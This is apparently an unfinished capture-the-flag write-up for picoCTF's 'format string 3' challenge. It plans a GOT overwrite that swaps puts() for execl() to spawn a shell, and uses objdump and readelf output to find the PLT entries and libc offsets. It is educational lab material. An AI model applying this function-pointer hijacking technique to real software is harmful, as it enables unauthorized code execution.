# format string 3 #

## Description ##

This program doesn't contain a win function. How can you win? Download
the binary here. Download the [source
here](format-string-3.c). Download libc here, download the interpreter
here. Run the binary with these two files present in the same
directory.

Additional details will be available after launching your challenge instance.

https://play.picoctf.org/events/73/challenges/challenge/449

## Hints ##

Is there any way to change what a function points to?

## Solution ##

Run executable:

	Howdy gamers!
	Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f1f3c0c83f0
	Hi
	Hi
	/bin/sh

Instead of `puts()` in line 28, we want to call `execl(normal_string, NULL)`. The first
argument is already correct. Somehow we need to control `rsi` (2nd
argument) as well - either as an argument to the command "/bin/bash"
or as NULL so we simply get a shell.

* Overwrite the address of `puts()` with the address of
  `execl()`. Both are in libc, and we can figure out their addresses
  as the program gives away the address of `setvbuf()` in libc.


Similar to 

https://blog.pwntools.com/posts/got-overwrite/

``` bash
objdump -Ds format-string-3 | grep -E 'setvbuf|puts'
```

    3ff578 6172745f 6d61696e 00736574 76627566  art_main.setvbuf
     3ff588 00737464 6f757400 70757473 00737464  .stdout.puts.std
     402040 64726573 73206f66 20736574 76627566  dress of setvbuf
    0000000000401070 <setvbuf@plt>:
      401074:       f2 ff 25 7d 2f 00 00    bnd jmp *0x2f7d(%rip)        # 403ff8 <setvbuf@GLIBC_2.2.5>
    0000000000401080 <puts@plt>:
      401084:       f2 ff 25 8d 2f 00 00    bnd jmp *0x2f8d(%rip)        # 404018 <puts@GLIBC_2.2.5>
      4011c7:       e8 a4 fe ff ff          call   401070 <setvbuf@plt>
      4011e5:       e8 86 fe ff ff          call   401070 <setvbuf@plt>
      401203:       e8 68 fe ff ff          call   401070 <setvbuf@plt>
      40121d:       e8 5e fe ff ff          call   401080 <puts@plt>
      401222:       48 8b 05 cf 2d 00 00    mov    0x2dcf(%rip),%rax        # 403ff8 <setvbuf@GLIBC_2.2.5>
      4012f2:       e8 89 fd ff ff          call   401080 <puts@plt>


``` bash
readelf -s libc.so.6 | grep -E ' puts@@| setvbuf@@| execl@@'
```

	1300: 000000000007a3f0   608 FUNC    WEAK   DEFAULT   16 setvbuf@@GLIBC_2.2.5
	1361: 00000000000da4d0   405 FUNC    GLOBAL DEFAULT   16 execl@@GLIBC_2.2.5
	1459: 0000000000079bf0   550 FUNC    WEAK   DEFAULT   16 puts@@GLIBC_2.2.5


``` bash
objdump -T libc.so.6 | grep -E ' setvbuf$| puts$| execl$'
```

                                          
    000000000007a3f0  w   DF .text  0000000000000260  GLIBC_2.2.5 setvbuf
    00000000000da4d0 g    DF .text  0000000000000195  GLIBC_2.2.5 execl
    0000000000079bf0  w   DF .text  0000000000000226  GLIBC_2.2.5 puts


